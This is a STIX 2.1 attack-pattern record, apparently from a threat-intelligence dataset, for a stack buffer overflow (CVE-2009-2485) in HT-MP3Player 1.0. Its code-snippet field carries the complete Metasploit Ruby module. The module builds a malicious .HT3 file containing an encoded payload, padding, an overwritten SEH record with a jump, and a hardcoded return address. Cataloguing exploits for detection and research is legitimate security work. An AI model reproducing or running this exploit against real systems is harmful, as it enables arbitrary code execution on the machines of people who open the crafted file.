{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9bfb1bf6-a73d-4fc3-b197-069ca2e2f13a",
    "created": "2024-08-14T16:36:43.830227Z",
    "modified": "2024-08-14T16:36:43.830231Z",
    "name": "HT-MP3Player 1.0 HT3 File Parsing Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HT-MP3Player 1.0. Arbitrary code execution could occur when parsing a specially crafted .HT3 file.  NOTE: The player installation does not register the file type to be handled. Therefore, a user must take extra steps to load this file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ht_mp3player_ht3_bof.rb",
            "external_id": "ht_mp3player_ht3_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2485"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HT-MP3Player 1.0 HT3 File Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HT-MP3Player 1.0.\n          Arbitrary code execution could occur when parsing a specially crafted\n          .HT3 file.\n\n          NOTE: The player installation does not register the file type to be\n          handled. Therefore, a user must take extra steps to load this file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hack4love <hack4love[at]hotmail.com>',\n          'His0k4',\n          'jduck',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2485' ],\n          [ 'OSVDB', '55449' ],\n          [ 'EDB', '9034' ],\n          [ 'EDB', '9038' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 4108,\n          'DisableNops'   \t=>  'True',\n          # input restriction: UTF-8!\n          'BadChars' \t\t\t=> [0,0x0a,0x0d,*(0x80..0xcf)].pack(\"C*\"),\n          'EncoderType' \t\t=> Msf::Encoder::Type::AlphanumMixed,\n          'StackAdjustment' => -8500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'HT-MP3Player 1.0',\n            {\n              'Ret' => 0x00406cff, # pop/pop/ret @ HTMP3Player.exe\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-06-29',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ht3']),\n      ])\n  end\n\n  def exploit\n\n    # payload first\n    bof = payload.encoded\n\n    # filler\n    bof << rand_text_alphanumeric(payload_space - bof.length)\n\n    # NOTE: the nul smashes a nul, oh no!\n    sehrec = generate_seh_record(target.ret)\n    # jmp -4108 (depends on target addr ending with 0xff)\n    sehrec[0,4] = \"\\xe9\\xef\\xef\\xff\"\n    bof << sehrec\n\n    # crash reading from offset 4096 (put bad addr here)\n    bof[4096,4] = [0xf0f0f0f0].pack('V')\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(bof)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-06-29",
    "x_mitre_platforms": [
        "win'"
    ]
}